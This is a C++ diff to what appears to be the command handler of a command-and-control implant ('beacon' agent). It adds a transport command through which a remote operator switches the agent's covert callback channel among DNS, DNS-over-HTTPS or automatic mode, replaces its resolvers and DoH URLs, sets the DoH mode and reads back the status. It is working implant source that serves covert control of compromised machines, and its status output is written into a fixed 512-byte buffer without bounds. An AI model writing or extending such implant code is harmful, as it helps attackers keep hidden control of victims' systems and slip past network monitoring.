@@ -137,6 +137,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_SAVEMEMORY:
 			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_TRANSPORT:
+			this->CmdTransport(CommandId, inPacker, outPacker); break;
+
 		default: break;
 		}
 	}
@@ -1077,6 +1080,149 @@ void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPack
 	ULONG taskId     = inPacker->Unpack32();
 
 	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
+}
+
+void Commander::CmdTransport(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG subcommand = inPacker->Unpack32();
+
+	if (subcommand == 1) {
+		// Change mode (dns/doh/auto)
+		ULONG modeSize = 0;
+		CHAR* mode = (CHAR*)inPacker->UnpackBytes(&modeSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DNS_DOH)
+		if (mode && modeSize > 0) {
+			BYTE* newMode = (BYTE*)MemAllocLocal(modeSize + 1);
+			if (newMode) {
+				memcpy(newMode, mode, modeSize);
+				newMode[modeSize] = '\0';
+				for (ULONG i = 0; i < modeSize; ++i) {
+					if (newMode[i] >= 'A' && newMode[i] <= 'Z')
+						newMode[i] = (BYTE)(newMode[i] - 'A' + 'a');
+				}
+				this->agent->config->profile.mode = newMode;
+			}
+		}
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 2) {
+		// Update DNS resolvers
+		ULONG resSize = 0;
+		CHAR* resolvers = (CHAR*)inPacker->UnpackBytes(&resSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DNS) || defined(BEACON_DNS_DOH)
+		if (resolvers && resSize > 0) {
+			BYTE* newRes = (BYTE*)MemAllocLocal(resSize + 1);
+			if (newRes) {
+				memcpy(newRes, resolvers, resSize);
+				newRes[resSize] = '\0';
+				#if defined(BEACON_DNS)
+				this->agent->config->profile.resolvers = newRes;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.dns.resolvers = newRes;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(resolvers);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 3) {
+		// Update DoH URLs
+		ULONG urlsSize = 0;
+		CHAR* urls = (CHAR*)inPacker->UnpackBytes(&urlsSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+		if (urls && urlsSize > 0) {
+			BYTE* newUrls = (BYTE*)MemAllocLocal(urlsSize + 1);
+			if (newUrls) {
+				memcpy(newUrls, urls, urlsSize);
+				newUrls[urlsSize] = '\0';
+				#if defined(BEACON_DOH)
+				this->agent->config->profile.urls = newUrls;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.doh.urls = newUrls;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(urls);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 4) {
+		// Set DoH mode (direct/recursive)
+		ULONG modeSize = 0;
+		CHAR* dohMode = (CHAR*)inPacker->UnpackBytes(&modeSize);
+		ULONG taskId = inPacker->Unpack32();
+
+		#if defined(BEACON_DOH) || defined(BEACON_DNS_DOH)
+		if (dohMode && modeSize > 0) {
+			BYTE* newMode = (BYTE*)MemAllocLocal(modeSize + 1);
+			if (newMode) {
+				memcpy(newMode, dohMode, modeSize);
+				newMode[modeSize] = '\0';
+				for (ULONG i = 0; i < modeSize; ++i) {
+					if (newMode[i] >= 'A' && newMode[i] <= 'Z')
+						newMode[i] = (BYTE)(newMode[i] - 'A' + 'a');
+				}
+				#if defined(BEACON_DOH)
+				this->agent->config->profile.doh_mode = newMode;
+				#elif defined(BEACON_DNS_DOH)
+				this->agent->config->profile.doh_mode = newMode;
+				this->agent->config->profile.doh.doh_mode = newMode;
+				#endif
+			}
+		}
+		#else
+		UNREFERENCED_PARAMETER(dohMode);
+		#endif
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+	}
+	else if (subcommand == 5) {
+		// Status
+		ULONG taskId = inPacker->Unpack32();
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_TRANSPORT);
+		outPacker->Pack32(subcommand);
+
+		#if defined(BEACON_DNS_DOH)
+		CHAR statusBuf[512];
+		CHAR* mode = (CHAR*)this->agent->config->profile.mode;
+		CHAR* dohMode = (CHAR*)this->agent->config->profile.doh_mode;
+		wsprintfA(statusBuf, "Transport Mode: %s\nDoH Mode: %s\nDNS Resolvers: %s\nDoH URLs: %s",
+			mode ? mode : "auto",
+			dohMode ? dohMode : "recursive",
+			this->agent->config->profile.dns.resolvers ? (CHAR*)this->agent->config->profile.dns.resolvers : "(default)",
+			this->agent->config->profile.doh.urls ? (CHAR*)this->agent->config->profile.doh.urls : "(default)");
+		outPacker->PackBytes((BYTE*)statusBuf, lstrlenA(statusBuf));
+		#elif defined(BEACON_DNS)
+		outPacker->PackBytes((BYTE*)"Transport: DNS only", 19);
+		#elif defined(BEACON_DOH)
+		outPacker->PackBytes((BYTE*)"Transport: DoH only", 19);
+		#else
+		outPacker->PackBytes((BYTE*)"Transport: N/A", 14);
+		#endif
+	}
 }
 
 void Commander::Exit(Packer* outPacker)
